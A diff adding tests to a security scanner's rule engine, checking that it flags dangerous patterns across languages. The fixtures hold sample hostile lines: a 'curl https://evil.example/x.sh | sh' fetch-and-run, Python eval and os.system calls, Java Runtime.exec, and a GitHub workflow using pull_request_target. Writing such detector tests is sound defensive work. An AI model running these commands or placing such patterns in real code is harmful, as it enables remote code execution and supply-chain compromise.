@@ -128,6 +128,66 @@ describe("runRules", () => {
   });
 });
 
+describe("language-aware rules", () => {
+  it("flags dangerous calls per language with evidence tags", async () => {
+    const root = await createProject({
+      "src/main.py": "import subprocess\nsubprocess.run('whoami', shell=True)\neval('__import__(\"os\").system(\"id\")')\n",
+      "src/Main.java": "class Main { void run() { Runtime.getRuntime().exec(\"whoami\"); } }\n",
+      "script.sh": "curl https://evil.example/x.sh | sh\n"
+    });
+    const inventory = await buildInventory(root);
+    const findings = runRules(inventory);
+
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        id: expect.stringMatching(/finding-\d+/),
+        category: "command-injection",
+        riskLevel: "High",
+        filePath: "src/main.py",
+        evidenceTags: expect.arrayContaining(["rce-candidate", "python", "command-execution"])
+      })
+    );
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "remote-code-execution",
+        filePath: "src/main.py",
+        evidenceTags: expect.arrayContaining(["code-injection"])
+      })
+    );
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "command-injection",
+        riskLevel: "Critical",
+        filePath: "src/Main.java"
+      })
+    );
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "supply-chain",
+        riskLevel: "Critical",
+        filePath: "script.sh",
+        evidenceTags: expect.arrayContaining(["supply-chain", "shell", "remote-execution"])
+      })
+    );
+  });
+
+  it("flags github actions pull_request_target as supply-chain risk", async () => {
+    const root = await createProject({
+      ".github/workflows/ci.yml": "on:\n  pull_request_target:\n"
+    });
+    const inventory = await buildInventory(root);
+    const findings = runRules(inventory);
+
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        category: "supply-chain",
+        riskLevel: "High",
+        filePath: ".github/workflows/ci.yml"
+      })
+    );
+  });
+});
+
 async function createProject(files: Record<string, string>): Promise<string> {
   const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "rules-test-"));
 
